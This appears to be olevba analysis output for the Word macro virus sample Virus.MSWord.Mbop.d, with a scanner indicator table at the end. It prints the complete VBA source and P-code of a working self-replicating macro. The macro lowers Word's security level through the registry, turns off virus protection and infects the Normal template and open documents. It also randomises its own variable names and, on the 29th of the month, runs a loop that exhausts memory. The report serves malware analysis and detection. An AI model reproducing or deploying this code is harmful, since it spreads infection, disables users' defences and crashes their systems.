olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Virus.MSWord.Mbop.d - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Options.VirusProtection = False
Options.SaveNormalPrompt = False
mbopfimbop = 1
Options.ConfirmConversions = False
Set mbopNtmbop = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
mbopsembop = 2
Set mbopAdmbop = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set mbopTdmbop = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
mboptrmbop = 5
mbopfnmbop = mbopfimbop & mbopsembop & mboptrmbop
For mbopiimbop = 1 To mbopTdmbop.countoflines
If InStr(mbopTdmbop.lines(mbopiimbop, 1), "Private Sub Document_Open()") <> 0 Then
mbopSlmbop = mbopiimbop
Exit For
End If
Next
mbopVcmbop = Trim(mbopTdmbop.lines(mbopSlmbop, mbopSlmbop + mbopfnmbop))
mboplvmbop = 97
If mbopNtmbop.countoflines > 0 Then
mbopNlmbop = mbopNtmbop.lines(1, mbopNtmbop.countoflines)
If InStr(mbopNlmbop, "Nt") = 0 And InStr(mbopNlmbop, "Sl") = 0 And InStr(mbopNlmbop, "Nl") = 0 And InStr(mbopNlmbop, "Ad") = 0 And InStr(mbopNlmbop, "Vc") = 0 And InStr(mbopNlmbop, "Td") = 0 Then
If InStr(LCase(mbopNlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopNlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopNtmbop.countoflines
If InStr(LCase(mbopNtmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopNtmbop.deletelines mbopnsmbop, 1
End If
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
Else
mbopNtmbop.addfromstring mbopVcmbop
mbopinmbop = True
End If
mbophvmbop = 122
If mbopAdmbop.countoflines > 0 Then
mbopAlmbop = mbopAdmbop.lines(1, mbopAdmbop.countoflines)
If InStr(mbopAlmbop, "Nt") = 0 And InStr(mbopAlmbop, "Sl") = 0 And InStr(mbopAlmbop, "Nl") = 0 And InStr(mbopAlmbop, "Ad") = 0 And InStr(mbopAlmbop, "Vc") = 0 And InStr(mbopAlmbop, "Td") = 0 Then
If InStr(LCase(mbopAlmbop), "private sub document_open()") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "private sub document_open()") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
For mbopimbop = mbopnsmbop To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "end sub") <> 0 Then
mbopnembop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, mbopnembop
End If
If InStr(LCase(mbopAlmbop), "option explicit") <> 0 Then
For mbopimbop = 1 To mbopAdmbop.countoflines
If InStr(LCase(mbopAdmbop.lines(mbopimbop, 1)), "option explicit") <> 0 Then
mbopnsmbop = mbopimbop
Exit For
End If
Next
mbopAdmbop.deletelines mbopnsmbop, 1
End If
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
Else
mbopAdmbop.addfromstring mbopVcmbop
mbopiambop = True
End If
mbop15mbop = 15
For mbopiimbop = 1 To mbop15mbop
Randomize
mbopTnmbop = mbopTnmbop & Chr(Int((mbophvmbop - mboplvmbop + 1) * Rnd + mboplvmbop))
Next
mbopd2mbop = 9
mbopVcmbop = mbopTdmbop.lines(1, mbopTdmbop.countoflines)
mbopTdmbop.deletelines 1, mbopTdmbop.countoflines
Do While InStr(mbopVcmbop, "mbop") <> 0
mbopVcmbop = Mid(mbopVcmbop, 1, InStr(mbopVcmbop, "mbop") - 1) & mbopTnmbop & Mid(mbopVcmbop, InStr(mbopVcmbop, "mbop") + Len("mbop"))
Loop
mbopTdmbop.addfromstring mbopVcmbop
mbopDymbop = Day(Now)
mbopd1mbop = 2
If mbopDymbop = mbopd1mbop & mbopd2mbop Then
Dim mbopstmbop()
mbopcambop = 0
Do
ReDim Preserve mbopstmbop(mbopcambop)
mbopqwmbop = CLng(1024)
mbopqambop = mbopqwmbop
mbopqzmbop = mbopqwmbop * mbopqambop
mbopstmbop(mbopcambop) = String(mbopqzmbop, Right(mbopTnmbop, 1))
DoEvents
mbopcambop = mbopcambop + 1
Loop
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mbop.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Módulo1 - 6171 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0001 
' 	St mbopfimbop 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopNtmbop 
' Line #8:
' 	LitDI2 0x0002 
' 	St mbopsembop 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopAdmbop 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set mbopTdmbop 
' Line #11:
' 	LitDI2 0x0005 
' 	St mboptrmbop 
' Line #12:
' 	Ld mbopfimbop 
' 	Ld mbopsembop 
' 	Concat 
' 	Ld mboptrmbop 
' 	Concat 
' 	St mbopfnmbop 
' Line #13:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	For 
' Line #14:
' 	Ld mbopiimbop 
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld mbopiimbop 
' 	St mbopSlmbop 
' Line #16:
' 	ExitFor 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Next 
' Line #19:
' 	Ld mbopSlmbop 
' 	Ld mbopSlmbop 
' 	Ld mbopfnmbop 
' 	Add 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St mbopVcmbop 
' Line #20:
' 	LitDI2 0x0061 
' 	St mboplvmbop 
' Line #21:
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopNlmbop 
' Line #23:
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopNlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #24:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #26:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #27:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #28:
' 	ExitFor 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #32:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #34:
' 	ExitFor 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Next 
' Line #37:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld mbopNlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	MemLd countoflines 
' 	For 
' Line #41:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #42:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #43:
' 	ExitFor 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopNtmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #49:
' 	LitVarSpecial (True)
' 	St mbopinmbop 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	ElseBlock 
' Line #52:
' 	Ld mbopVcmbop 
' 	Ld mbopNtmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #53:
' 	LitVarSpecial (True)
' 	St mbopinmbop 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitDI2 0x007A 
' 	St mbophvmbop 
' Line #56:
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopAlmbop 
' Line #58:
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nt"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Sl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Nl"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Ad"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Vc"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld mbopAlmbop 
' 	LitStr 0x0002 "Td"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #59:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #61:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x001B "private sub document_open()"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #62:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #63:
' 	ExitFor 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	Ld mbopnsmbop 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #67:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0007 "end sub"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #68:
' 	Ld mbopimbop 
' 	St mbopnembop 
' Line #69:
' 	ExitFor 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	StartForVariable 
' 	Next 
' Line #72:
' 	Ld mbopnsmbop 
' 	Ld mbopnembop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld mbopAlmbop 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	StartForVariable 
' 	Ld mbopimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	MemLd countoflines 
' 	For 
' Line #76:
' 	Ld mbopimbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x000F "option explicit"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #77:
' 	Ld mbopimbop 
' 	St mbopnsmbop 
' Line #78:
' 	ExitFor 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Next 
' Line #81:
' 	Ld mbopnsmbop 
' 	LitDI2 0x0001 
' 	Ld mbopAdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #84:
' 	LitVarSpecial (True)
' 	St mbopiambop 
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	Ld mbopVcmbop 
' 	Ld mbopAdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #88:
' 	LitVarSpecial (True)
' 	St mbopiambop 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	LitDI2 0x000F 
' 	St mbop15mbop 
' Line #91:
' 	StartForVariable 
' 	Ld mbopiimbop 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mbop15mbop 
' 	For 
' Line #92:
' 	ArgsCall Read 0x0000 
' Line #93:
' 	Ld mbopTnmbop 
' 	Ld mbophvmbop 
' 	Ld mboplvmbop 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld mboplvmbop 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St mbopTnmbop 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	LitDI2 0x0009 
' 	St mbopd2mbop 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemLd lines 0x0002 
' 	St mbopVcmbop 
' Line #97:
' 	LitDI2 0x0001 
' 	Ld mbopTdmbop 
' 	MemLd countoflines 
' 	Ld mbopTdmbop 
' 	ArgsMemCall deletelines 0x0002 
' Line #98:
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #99:
' 	Ld mbopVcmbop 
' 	LitDI2 0x0001 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	Ld mbopTnmbop 
' 	Concat 
' 	Ld mbopVcmbop 
' 	Ld mbopVcmbop 
' 	LitStr 0x0004 "mbop"
' 	FnInStr 
' 	LitStr 0x0004 "mbop"
' 	FnLen 
' 	Add 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St mbopVcmbop 
' Line #100:
' 	Loop 
' Line #101:
' 	Ld mbopVcmbop 
' 	Ld mbopTdmbop 
' 	ArgsMemCall addfromstring 0x0001 
' Line #102:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St mbopDymbop 
' Line #103:
' 	LitDI2 0x0002 
' 	St mbopd1mbop 
' Line #104:
' 	Ld mbopDymbop 
' 	Ld mbopd1mbop 
' 	Ld mbopd2mbop 
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #105:
' 	Dim 
' 	VarDefn mbopstmbop
' Line #106:
' 	LitDI2 0x0000 
' 	St mbopcambop 
' Line #107:
' 	Do 
' Line #108:
' 	OptionBase 
' 	Ld mbopcambop 
' 	Redim (Preserve) mbopstmbop 0x0001 (As Variant)
' Line #109:
' 	LitDI2 0x0400 
' 	Coerce (Lng) 
' 	St mbopqwmbop 
' Line #110:
' 	Ld mbopqwmbop 
' 	St mbopqambop 
' Line #111:
' 	Ld mbopqwmbop 
' 	Ld mbopqambop 
' 	Mul 
' 	St mbopqzmbop 
' Line #112:
' 	Ld mbopqzmbop 
' 	Ld mbopTnmbop 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	ArgsLd String$ 0x0002 
' 	Ld mbopcambop 
' 	ArgsSt mbopstmbop 0x0001 
' Line #113:
' 	ArgsCall DoEvents 0x0000 
' Line #114:
' 	Ld mbopcambop 
' 	LitDI2 0x0001 
' 	Add 
' 	St mbopcambop 
' Line #115:
' 	Loop 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

